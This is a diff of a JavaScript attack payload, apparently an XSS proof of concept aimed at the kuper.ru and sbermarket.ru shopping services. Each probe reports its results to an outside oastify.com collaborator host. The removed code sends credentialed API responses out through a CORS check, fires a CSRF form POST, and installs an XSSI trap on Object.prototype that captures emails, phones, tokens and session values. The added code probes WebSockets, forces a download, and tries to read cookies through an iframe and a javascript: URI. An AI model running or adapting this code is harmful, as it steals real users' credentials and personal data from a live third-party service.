@@ -1,4 +1,4 @@
-alert('step 2');
+alert('step 3');
 var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';
 
 function send(path, data) {
@@ -10,127 +10,98 @@ function send(path, data) {
     }
 }
 
-(function corsCheck() {
-    var endpoints = [
-        'https://api.kuper.ru/v2/user',
-        'https://api.kuper.ru/v2/app_lt_configuration',
-        'https://api.kuper.ru/v2/orders',
-        'https://api.kuper.ru/v2/user/addresses',
-        'https://api.kuper.ru/v2/cart',
-        'https://stf-gw.kuper.ru/',
-        'https://rs.kuper.ru/',
-        'https://kuper.ru/',
-        'https://sbermarket.ru/',
-        'https://scanpay.sbermarket.ru/',
-        'https://landings.sbermarket.ru/'
-    ];
-
-    endpoints.forEach(function(ep, i) {
-        setTimeout(function() {
-            try {
-                fetch(ep, { credentials: 'include' })
-                    .then(function(r) {
-                        var info = {
-                            url: ep,
-                            status: r.status,
-                            type: r.type, // 'cors', 'opaque', 'basic'
-                            acao: r.headers.get('access-control-allow-origin'),
-                            acac: r.headers.get('access-control-allow-credentials')
-                        };
-                        // Если type !== 'opaque', значит CORS разрешён!
-                        if (r.type !== 'opaque') {
-                            r.text().then(function(body) {
-                                info.body = body.substring(0, 3000);
-                                send('cors-HIT-' + i, info);
-                            });
-                        } else {
-                            send('cors-blocked-' + i, info);
-                        }
-                    })
-                    .catch(function(e) {
-                        send('cors-err-' + i, { url: ep, err: e.message });
-                    });
-            } catch(e) {}
-        }, i * 300);
-    });
+(function nocorsFetch() {
+    setTimeout(function() {
+        try {
+            // Делаем запрос к kuper.ru через наш сервер-прокси
+            // Запрос К kuper.ru пойдёт с cookies
+            fetch('https://kuper.ru/', {
+                credentials: 'include',
+                mode: 'no-cors'
+            }).then(function(r) {
+                send('nocors-result', { type: r.type, status: r.status, redirected: r.redirected });
+            }).catch(function(e) {
+                send('nocors-err', { err: e.message });
+            });
+        } catch(e) {}
+    }, 7000);
 })();
 
 
+(function wsCheck() {
+    setTimeout(function() {
+        var wsUrls = [
+            'wss://kuper.ru/cable',
+            'wss://kuper.ru/ws',
+            'wss://api.kuper.ru/cable',
+            'wss://api.kuper.ru/ws',
+            'wss://stf-gw.kuper.ru/ws'
+        ];
 
-(function csrfForms() {
+        wsUrls.forEach(function(url, i) {
+            try {
+                var ws = new WebSocket(url);
+                ws.onopen = function() {
+                    send('ws-OPEN-' + i, { url: url });
+                    ws.close();
+                };
+                ws.onerror = function() {
+                    send('ws-err-' + i, { url: url });
+                };
+                ws.onclose = function(e) {
+                    send('ws-close-' + i, { url: url, code: e.code, reason: e.reason });
+                };
+            } catch(e) {
+                send('ws-ex-' + i, { url: url, err: e.message });
+            }
+        });
+    }, 8000);
+})();
+
+
+(function downloadTrigger() {
     setTimeout(function() {
         try {
-            // Создаём iframe для сбора результата
+            var a = document.createElement('a');
+            a.href = 'https://kuper.ru/favicon.ico';
+            a.download = 'test.ico';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            send('download-triggered', { url: a.href });
+        } catch(e) {
+            send('download-err', { err: e.message });
+        }
+    }, 9000);
+})();
+
+
+(function iframeTest() {
+    setTimeout(function() {
+        try {
             var ifr = document.createElement('iframe');
-            ifr.name = 'csrf_sink';
-            ifr.style.display = 'none';
+            ifr.src = 'https://kuper.ru/';
+            ifr.style.width = '1px';
+            ifr.style.height = '1px';
             document.body.appendChild(ifr);
 
-            // Попытка 1: POST form-urlencoded к API
-            var f1 = document.createElement('form');
-            f1.method = 'POST';
-            f1.action = 'https://api.kuper.ru/v2/user';
-            f1.target = 'csrf_sink';
-            f1.enctype = 'application/x-www-form-urlencoded';
-
-            var inp = document.createElement('input');
-            inp.type = 'hidden';
-            inp.name = 'email';
-            inp.value = 'security-test@test.com';
-            f1.appendChild(inp);
-            document.body.appendChild(f1);
-            f1.submit();
-
-            send('csrf-form-sent', { target: 'api.kuper.ru/v2/user', method: 'POST' });
-        } catch(e) {
-            send('csrf-err', { err: e.message });
-        }
-    }, 4000);
-})();
-
-
-
-(function xssi() {
-    setTimeout(function() {
-        try {
-            // Ловушки для перехвата JSON-данных
-            var stolen = [];
-            var fields = ['id','email','phone','name','first_name','last_name',
-                          'address','token','access_token','session'];
-
-            fields.forEach(function(field) {
+            // Ждём загрузки и пробуем читать
+            setTimeout(function() {
                 try {
-                    Object.defineProperty(Object.prototype, field, {
-                        set: function(v) {
-                            stolen.push(field + '=' + String(v));
-                            send('xssi-field', { field: field, value: String(v) });
-                        },
-                        get: function() { return undefined; },
-                        configurable: true
-                    });
-                } catch(e) {}
-            });
-
-            // Загружаем API через script tag
-            var urls = [
-                'https://api.kuper.ru/v2/user',
-                'https://api.kuper.ru/v2/app_lt_configuration',
-                'https://api.kuper.ru/v2/user/addresses'
-            ];
-
-            urls.forEach(function(url, i) {
-                var s = document.createElement('script');
-                s.src = url;
-                s.onload = function() {
-                    send('xssi-loaded-' + i, { url: url, stolen: stolen });
-                };
-                s.onerror = function() {
-                    send('xssi-err-' + i, { url: url, stolen: stolen });
-                };
-                document.body.appendChild(s);
-            });
+                    var c = ifr.contentDocument.cookie;
+                    send('iframe-COOKIE', { cookie: c });
+                } catch(e) {
+                    send('iframe-sop', { err: e.message });
+                }
+                try {
+                    // Попытка навигации iframe на javascript: для чтения cookie
+                    ifr.contentWindow.location = 'javascript:void(parent.postMessage(document.cookie,"*"))';
+                } catch(e) {
+                    send('iframe-jsuri', { err: e.message });
+                }
+            }, 3000);
         } catch(e) {
-            send('xssi-outer-err', { err: e.message });
+            send('iframe-err', { err: e.message });
         }
-    }, 5000);
+    }, 10000);
 })();
